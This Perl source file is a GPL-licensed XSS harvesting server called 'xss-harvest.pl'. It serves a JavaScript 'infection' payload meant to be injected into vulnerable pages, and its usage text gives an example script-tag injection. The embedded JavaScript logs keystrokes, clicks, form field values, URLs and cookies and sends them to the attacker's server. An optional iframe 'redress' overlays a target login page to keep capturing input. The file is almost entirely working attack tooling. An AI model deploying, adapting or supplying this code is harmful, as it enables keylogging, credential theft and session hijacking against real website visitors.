#!/usr/bin/perl
#    ORIGINAL AUTHOR CAN BE FOUND AT http://0x90.co.uk
#    VERSION 0.2 

#    Usage: ./xss-harvest.pl -l [-r redresspage] [-p listen port]

#    Written by nopslider nop@0x90.co.uk 11/07/2011

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.

package XSSHarvest;

use warnings;
use strict;

use HTTP::Server::Simple::CGI;
use base qw(HTTP::Server::Simple::CGI);
use Digest::MD5 qw(md5_hex);
use Fcntl qw(:flock);
use Time::Local;
use Fcntl qw(:flock SEEK_END);
use Term::ANSIColor;
use Getopt::Std;

# Command line options
my %options;

if (! getopts('p:r:l', \%options)) {
	usage();
	exit;
}
# If no -l specified, show options
if (! $options{l} == 1) {
	usage();
	exit;
}

# The client-side javascript - listed at the bottom of this file
my @infection = <DATA>;

# Dispatcher functions
my %dispatch = (
     '/i' => \&infect,
     '/k' => \&key,
     '/p' => \&page,
     '/d' => \&data,
     '/'  => \&home
);

# Handle incoming requests
sub handle_request {
     my $self = shift;
     my $cgi  = shift;
   
     my $path = $cgi->path_info();
     my $handler = $dispatch{$path};
 
     if (ref($handler) eq "CODE") {
         print "HTTP/1.0 200 OK\r\n";
         $handler->($cgi);
         
     } else {
         print "HTTP/1.0 404 Not found\r\n";
         print $cgi->header,
               $cgi->start_html('Not found'),
               $cgi->h1('Not found'),
               $cgi->end_html;
     }
}
 
# Return the infection script
sub infect {
     	my $cgi  = shift;   
     	return if !ref $cgi;
     
	my $ip = $cgi->remote_addr();
	my $uid;
	my $fh;	
	my $ua = $cgi->user_agent();

	if ($uid = $cgi->cookie('x55')) {
		$fh = getFile($uid);
		print STDERR "\n[INFO] Returning vicim ($uid) - $ip\n";
		print $cgi->header(-type=>"text/javascript");
	}
	else {
		$uid = md5_hex(time . "-$ip");
		print STDERR "\n[INFO] New victim incoming! ($uid) - $ip\n";
		$fh = getFile($uid);
		
		my $setcookie = $cgi->cookie(-name=>'x55',
                             -value=>$uid,
                             -expires=>'+1y');
		print $cgi->header(-cookie=>$setcookie, -type=>"text/javascript");
	}

	lock($fh);
	print $fh "\n************************************\n";
	print $fh "[INFECTION] " . localtime() . "\n";
	print $fh "[IP] $ip\n";
	print $fh "[UID] $uid\n";
	print $fh "[UA] $ua\n";
	print $fh "************************************\n";
	unlock($fh);

	# Return infection script
	getInfection($cgi->url(-base));

	print STDERR "\n[INFO] Delivered infection payload to ($uid) - $ip\n";
}

# Accept a key
sub key {
     	my $cgi  = shift;   
	return if !ref $cgi;

	my $uid = $cgi->cookie('x55') || die "\n[WARN] Key received without cookie\n";

	print STDERR ".";

	my $key = $cgi->param('k');
	my $fh = getFile($uid);

	lock($fh);
	print $fh $key;
	unlock($fh);

	print $cgi->header(-Cache_Control=>'no-store', -type=>'text/javascript', -Pragma=>'no-cache', -Expires=>'-1');
	print "//done";
}

# Accept a page load
sub page {
     	my $cgi  = shift;   
     	return if !ref $cgi;
     
	my $uid = $cgi->cookie('x55') || die "\n[WARN] Page received without cookie\n";
     	my $cookie = $cgi->param('c') || "";
     	my $url = $cgi->param('p') || "";

	print STDERR "\n[INFO] New page loaded by victim ($uid) - $url\n";

	my $fh = getFile($uid);

	lock($fh);
	print $fh "\n************************************\n";
	print $fh "[PAGE LOADED] " . localtime() . "\n";
	print $fh "[URL] $url\n";
	print $fh "[COOKIES] \n$cookie\n" unless ($cookie eq "");
	print $fh "************************************\n";
	unlock($fh);

	print $cgi->header(-type=>'text/javascript');
	print "//done";
}

# Accept arbitrary data
sub data {
     	my $cgi  = shift;   
     	return if !ref $cgi;
     
	my $uid = $cgi->cookie('x55') || die "\n[WARN] Data received without cookie\n";
	my $data = $cgi->param('d') || "";

	print STDERR "\n[INFO] Data communication received. ($uid)\n";

	my $fh = getFile($uid);

	lock($fh);
	print $fh "\n************************************\n";
	print $fh "[DATA] " . localtime() . "\n";
	print $fh $data;
	print $fh "\n************************************\n";
	unlock($fh);
	print $cgi->header(-type=>'text/javascript');
	print "//done";
}
 
# Invalid request
sub home {
     	my $cgi  = shift;
     	return if !ref $cgi;

	print STDERR "[WARN] Direct request to server.\n";
	print $cgi->header();
}

# Return file handle for victim
sub getFile {
	my $uid = shift;

	if ($uid !~ /^[0-9a-z]{32}$/) {
		die "\n[ERROR] Invalid UID. Someone may be tampering with parameters.\n";
	}
	else {
		my $file = "./history/$uid.txt";

		# Check file exists
		if (-e "$file") {
			open(FH,">>$file") || die("\n[ERROR] Cannot Open file $file.\n");
		}
		else {
			print STDERR "\n[INFO] Creating new history file $file.\n";
			open(FH,">>$file") || die("\n[ERROR] Cannot create file $file.\n");
		}
		# Return file handle
		return *FH;
	}
}

# flock a file
sub lock {
        my ($fh) = @_;
        flock($fh, LOCK_EX) or die "[ERROR] Cannot lock history file - $!\n";
        # and, in case someone appended while we were waiting...
        seek($fh, 0, SEEK_END) or die "[ERROR] Cannot seek - $!\n";
}

# release a file
sub unlock {
        my ($fh) = @_;
        flock($fh, LOCK_UN) or die "[ERROR] Cannot unlock file - $!\n";
}

# populate client-side javascript variables
sub getInfection {
	my $ip = shift;

	my $redresspage = $options{r};
	
	# Prepare the infection
	print "var destination = '$ip';\n";
	if (defined($redresspage)) {
 		print "var redresspage = '$redresspage';\n";
	}
	else {
		print "var redresspage = undefined;\n";
	}

	foreach (@infection) {
		print $_;
	}
}

# Usage information
sub usage {
	print "\nUsage:\n\t$0 -l [-p Port] [-r Redress the victims browser]\n";

	print "\nStart with (-l) and point your victims at http://<YOUR INTERNET FACING IP>/i to be \"infected\".\n";
	print "\te.g. inject something like this into a vulnerable page - <script src='http://<YOURSERVERIP>/i'></script>\n\n";
	print "Optionally run $0 with the (-r) parameter to redress the victims browser to ";
	print "a different page on the same site (such as a login form) after successful infection.\n";
	print "\te.g. $0 -l -r http://<TARGETSITE>/login.php \n\n";
	print "For persistent XSS (infection persists across subsequent pages on the same domain), ";
	print "you must use the redress feature, even if you intend to display the original vulnerable page.\n\n";
}

# Startup server code....
my $port = $options{p} || 80;
 
my $server = XSSHarvest->new($port);
sub net_server { 'Net::Server::PreFork' };

print color 'bold';
print "\n************************";
print "\n*  XSS-Harvest Server  *\n";
print "************************";
print color 'reset';
print "\n\n[INFO] Starting server....\n";

# Check history directory exists
if (! -d './history') {
	print "[INFO] No history directory found, creating...\n";
	mkdir 'history' || die "[ERROR] Cannot create history directory\n";
}
else {
	print "[INFO] History directory found.\n";
}

$server->run();

__DATA__
var body = document.getElementsByTagName("body")[0];

if (redresspage !== undefined && ! document.getElementById("redressFrame")) {
	document.write("<div id='redressDiv' style='height:100%;width:100%;position:absolute;top:0;right:0;left:0;bottom:0;margin:0;padding:0;background-color:white;'><iframe onload='sendPage()' frameBorder='0' id='redressFrame' width='100%' height='100%' src='" + redresspage + "'></iframe></div>");
} else { 
	addListeners(this.body);
	var pageurl = escape(location.href);
	var cookies = escape(document.cookie);
	var referer = escape(document.referrer);
	var initalinfection = destination + '/p?p=' + pageurl + '&c=' + cookies + '&r=' + referer;
	addScript(initalinfection);
}

function addListeners(body) {
	if (body.addEventListener) {
		body.addEventListener("keypress",keypressAction,false);
		body.addEventListener("keydown",keydownAction,false);
		body.addEventListener("click",click,false);
	} else if (body.attachEvent){
		body.attachEvent("onkeypress", keypressAction);
		body.attachEvent("onkeydown", keydownAction);
		body.attachEvent("onclick", click);
	} else {
		var error = escape("[ERROR] Cannot add event listeners to page");
		addScript(destination + '/d?d=' + error);
	}
}

function click(e) {
	var doc;
	if (frame = document.getElementById("redressFrame")) {
		doc = frame.contentWindow.document || frame.contentDocument.document;
	}
	else {
		doc = document;	
	}
	var X = e.pageX || (e.clientX + doc.body.scrollLeft);
	var Y = e.pageY || (e.clientY + doc.body.scrollTop);
	var data = "[CLICK RECEIVED]\n\t[COORDS] "+X+","+Y;
	var element = doc.activeElement;
	var name = element.name || "";
	var value = element.value || "";
	var text = element.text || "";
	var tag = element.tagName || "";
	if (tag != "") {
		data = data + "\n\t[TAGNAME]"+tag;
	}
	if (name != "") {
		data = data + "\n\t[NAME]"+name;
	}
	if (value != "") {
		data = data + "\n\t[VALUE]"+value;
	}
	if (text != "") {
		data = data + "\n\t[TEXT]"+text;
	}

	if (element.selectedIndex) {
		data = data + "\n\t[SELECTED]"+ element.options[element.selectedIndex].text;
	}

	data = escape(data);
	addScript(destination + '/d?d=' + data);
}

function sendKey(key) {
	var randomnumber=Math.floor(Math.random()*1001);
	addScript(destination + '/k?k=' + key + '&t=' + randomnumber);
}

function keypressAction(e) {
	var key;
	if (e.which == null)
     		key = String.fromCharCode(e.keyCode); 
  	else if (e.which != 0 && e.charCode != 0)
    		key = String.fromCharCode(e.which);	
  	else key = "<specialkey>";
	sendKey(escape(key));
}

function keydownAction(e) {
	var key;
     	key = e.keyCode || e.which;
	if (key == 9) sendKey(escape("<TAB>"));
	if (key == 13) sendKey(escape("<ENTER>"));
	if (key == 37) sendKey(escape("<LEFT ARROW>"));
	if (key == 38) sendKey(escape("<UP ARROW>"));
	if (key == 39) sendKey(escape("<RIGHT ARROW>"));
	if (key == 40) sendKey(escape("<DOWN ARROW>"));
	if (key == 8) sendKey(escape("<BACK SPACE>"));
	if (key == 46) sendKey(escape("<DELETE>"));
}

function sendPage() {
	var frame = document.getElementById("redressFrame");
	var doc =  frame.contentWindow.document || frame.contentDocument.document;
   	if (doc.document) {
      		doc = doc.document;
      	} 
	document.title = doc.title;
	var body = doc.getElementsByTagName("body")[0];
	addListeners(body);
	var url = escape(doc.location.href);
	var cookies = escape(doc.cookie);
	var pageurl = destination + '/p?p=' + url + '&c=' + cookies;
	addScript(pageurl);	
}

function addScript(url) {
    var scr = document.createElement("script");
    scr.setAttribute("language", "JavaScript");
    scr.setAttribute("src", url);
    document.getElementsByTagName("body")[0].appendChild(scr);
}

